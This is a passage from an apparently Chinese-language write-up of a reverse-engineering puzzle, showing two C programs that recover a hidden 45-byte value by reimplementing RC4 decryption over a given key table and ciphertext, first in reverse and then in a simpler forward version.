class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> key2[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">170</span>, <span class="number">109</span>, <span class="number">41</span>, <span class="number">217</span>, <span class="number">180</span>, <span class="number">246</span>, <span class="number">227</span>, <span class="number">208</span>, <span class="number">96</span>, <span class="number">11</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">205</span>, <span class="number">134</span>, <span class="number">234</span>, <span class="number">212</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">250</span>, <span class="number">79</span>, <span class="number">127</span>, <span class="number">177</span>, <span class="number">105</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">253</span>, <span class="number">47</span>, <span class="number">125</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">60</span>, <span class="number">117</span>, <span class="number">107</span>, <span class="number">44</span>, <span class="number">162</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">93</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>, <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">100</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">140</span>, <span class="number">39</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">64</span>, <span class="number">38</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>, <span class="number">91</span>,</span><br><span class="line">        <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>, <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>, <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">128</span>, <span class="number">25</span>, <span class="number">86</span>, <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">126</span>, <span class="number">53</span>, <span class="number">90</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">156</span>,</span><br><span class="line">        <span class="number">158</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">31</span>, <span class="number">196</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">28</span>, <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">199</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">206</span>, <span class="number">67</span>, <span class="number">228</span>, <span class="number">26</span>, <span class="number">237</span>, <span class="number">9</span>, <span class="number">51</span>, <span class="number">29</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">136</span>, <span class="number">17</span>, <span class="number">176</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">59</span>, <span class="number">52</span>, <span class="number">254</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//v5,v6和key都需要提前跑一遍获取最后的状态,所以这个代码非常麻烦</span></span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">45</span>;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="number">238</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">45</span>; i &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">        --i;</span><br><span class="line">        s[i] = s3[i] ^ (key2[((<span class="type">int</span>)key2[v5] + key2[v6])%<span class="number">256</span>]);</span><br><span class="line">        swap(key2 + v5, key2 + v6);</span><br><span class="line">        v6 = (v6 - (<span class="type">int</span>) key2[v5] + <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">        v5 = (v5 - <span class="number">1</span>) &lt; <span class="number">0</span> ? <span class="number">255</span> : v5 - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里用来求循环的最终状态以反向执行</span></span><br><span class="line"><span class="comment">    int v5 = 0;</span></span><br><span class="line"><span class="comment">    int v6 = 0;</span></span><br><span class="line"><span class="comment">    int i = 0;</span></span><br><span class="line"><span class="comment">    while (i &lt; len) &#123;</span></span><br><span class="line"><span class="comment">        v5 = (v5 + 1) % 256;</span></span><br><span class="line"><span class="comment">        v6 = (v6 + key2_origin[v5]) % 256;</span></span><br><span class="line"><span class="comment">        swap(key2_origin + v5, key2_origin + v6);</span></span><br><span class="line"><span class="comment">        ++i;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;v5=%d,v6=%d\n&quot;, v5, v6);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 256; ++i) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d,&quot;, key2_origin[i]);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们实际上知道RC4的加解密的过程是相同的…</p><p>所以代码实际上基本不用改…</p><p>正解代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">0</span>, v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        v6 = (v6 + key2_origin[v5]) % <span class="number">256</span>;</span><br><span class="line">        swap(key2_origin + v5, key2_origin + v6);</span><br><span class="line">        s[i] = s3[i] ^ (key2_origin[((<span class="type">int</span>) key2_origin[v5] + key2_origin[v6]) % <span class="number">256</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d 